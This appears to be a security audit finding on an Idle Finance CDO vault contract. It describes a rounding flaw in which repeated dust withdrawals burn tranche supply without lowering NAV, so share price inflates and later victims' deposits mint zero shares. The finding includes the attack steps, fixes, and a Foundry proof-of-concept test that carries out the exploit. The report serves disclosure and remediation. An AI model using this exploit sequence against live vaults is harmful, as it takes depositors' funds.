### Title
Dust withdrawal requests burn tranche supply without reducing NAV, enabling share-price inflation and zero-share deposits - (File: `contracts/IdleCDOEpochVariant.sol`)

### Summary
`requestWithdraw()` can burn a nonzero amount of tranche tokens even when the rounded underlying value is zero. Because `IdleCreditVault.requestWithdraw()` returns without burning strategy-token backing for a zero amount, an early KYC-passed lender can repeatedly sacrifice dust-sized tranche transfers to reduce supply while preserving `lastNAV*`. Combined with the permanently locked `MIN_LIQUIDITY`, this inflates NAV per share and can cause subsequent deposits to mint zero shares while still accounting and forwarding the depositor's principal.

### Finding Description
During the buffer phase, an allowed lender calls `requestWithdraw()` with a nonzero tranche amount small enough that:

```solidity
_underlyings = _amount * _tranchePrice(_tranche) / ONE_TRANCHE_TOKEN;
```

rounds to zero in `contracts/IdleCDOEpochVariant.sol:756`. For the normal withdrawal path, `principal` remains zero, so `IdleCreditVault.requestWithdraw(0, ...)` returns immediately without burning any CDO strategy-token backing. Control then reaches `_withdrawOps(_amount, 0, _tranche)`, which burns the caller's tranche tokens and subtracts zero from the saved NAV.

The key sequence is:

1. First allowed lender deposits enough assets to receive a large tranche balance.
2. The lender calls `requestWithdraw(dust, tranche)` where `dust * price / 1e18 == 0`.
3. `IdleCreditVault.requestWithdraw()` exits on the zero amount and preserves the strategy-token backing.
4. `_withdrawOps()` burns `dust` tranche tokens but subtracts zero NAV.
5. Repeating this reduces the attacker-controlled supply while NAV remains constant.
6. Once NAV per remaining share is sufficiently high, `_mintSharesAtCurrPrice()` calculates `amount * 1e18 / price`, which can round to zero. The victim's deposit is nevertheless added to `lastNAV*` and forwarded to the strategy.

`IdleCDOTranche` permanently adds 1,000 shares to `address(1)` on the first mint, preventing the attacker from removing all supply, but it does not prevent the attacker from reducing controllable supply to one share and leaving almost all NAV represented by 1,001 shares.

### Impact Explanation
The vault's fair mint/burn invariant is broken: tranche supply decreases without a corresponding decrease in tranche NAV or strategy-token backing.

The attacker retains a share of the inflated NAV through their remaining tranche balance. Any victim deposit satisfying roughly:

```text
depositAmount < lastNAV / remainingSupply
```

mints zero shares and becomes a donation to existing tranche holders, including the attacker's remaining share. This produces direct loss for the depositor and can make small deposits systematically worthless. Unlike the RToken report, there is no explicit exchange-rate bound that reverts and bricks the vault, but the same low-supply price-inflation primitive exists through rounding.

### Likelihood Explanation
The attacker only needs to be an early KYC-allowed lender and spend their own tranche balance. The attack is most practical immediately after vault initialization, when an attacker can control most of the circulating tranche supply. `MIN_LIQUIDITY` limits the maximum inflation multiple for a fixed initial NAV, but does not eliminate the issue.

The attack does not require a privileged role, borrower misbehavior, a default, oracle manipulation, or donated assets. It works in the normal buffer phase before an epoch starts.

### Recommendation
Prevent zero-value withdrawals from burning tranche supply:

- Revert in `requestWithdraw()` when `_underlyings == 0` for a nonzero `_amount`.
- Alternatively, calculate and validate the burned strategy-token principal before burning tranche tokens, and revert if it is zero.
- Enforce a minimum withdrawal amount denominated in underlying units.
- Ensure `_withdrawOps()` is only reached after a nonzero amount of backing has actually moved to a withdrawal receipt.
- Consider rejecting deposits that mint zero shares unless the caller explicitly opts into donating principal.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

contract DustShareInflationTest is Test {
    IdleCDOEpochVariant cdo;
    IdleCDOTranche aa;
    IERC20Detailed underlying;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    uint256 constant ONE_UNDERLYING = 1e6; // USDC-style underlying
    uint256 constant ONE_TRANCHE = 1e18;

    function testDustWithdrawInflatesSharePrice() public {
        // Deploy and initialize vault, allow attacker and victim in Keyring,
        // then fund both accounts.

        uint256 attackerDeposit = 10_000 * ONE_UNDERLYING;

        vm.startPrank(attacker);
        underlying.approve(address(cdo), attackerDeposit);
        uint256 attackerShares = cdo.depositAA(attackerDeposit);
        vm.stopPrank();

        uint256 supplyBefore = aa.totalSupply();
        uint256 navBefore = cdo.lastNAVAA();
        uint256 priceBefore = cdo.tranchePrice(address(aa));

        // Largest amount that still rounds to zero underlying at the current price.
        uint256 dust = ONE_TRANCHE / priceBefore;
        if (dust * priceBefore == ONE_TRANCHE) dust--;

        while (aa.balanceOf(attacker) > dust) {
            vm.prank(attacker);
            cdo.requestWithdraw(dust, address(aa));
        }

        uint256 finalDust = aa.balanceOf(attacker) - 1;
        if (finalDust != 0) {
            vm.prank(attacker);
            cdo.requestWithdraw(finalDust, address(aa));
        }

        assertEq(aa.balanceOf(attacker), 1);
        assertEq(aa.totalSupply(), 1001); // attacker's 1 share + MIN_LIQUIDITY
        assertEq(cdo.lastNAVAA(), navBefore); // NAV did not decrease
        assertLt(aa.totalSupply(), supplyBefore);

        uint256 priceAfter = cdo.tranchePrice(address(aa));
        assertGt(priceAfter, priceBefore);

        // Pick a victim deposit below NAV / remainingSupply so minting rounds to zero.
        uint256 victimDeposit = navBefore * aa.totalSupply() / ONE_TRANCHE / 2;
        vm.assume(victimDeposit != 0);

        deal(address(underlying), victim, victimDeposit);
        vm.startPrank(victim);
        underlying.approve(address(cdo), victimDeposit);
        uint256 minted = cdo.depositAA(victimDeposit);
        vm.stopPrank();

        assertEq(minted, 0);
        assertEq(cdo.lastNAVAA(), navBefore + victimDeposit);
        assertEq(aa.balanceOf(victim), 0);
    }
}
```

The critical state changes are that `requestWithdraw()` burns user tranche supply at `contracts/IdleCDOEpochVariant.sol:790`, while the strategy returns early for a zero withdrawal amount at `contracts/strategies/idle/IdleCreditVault.sol:246`. Share minting then uses the inflated price at `contracts/IdleCDOCreditVault.sol:344-347`.
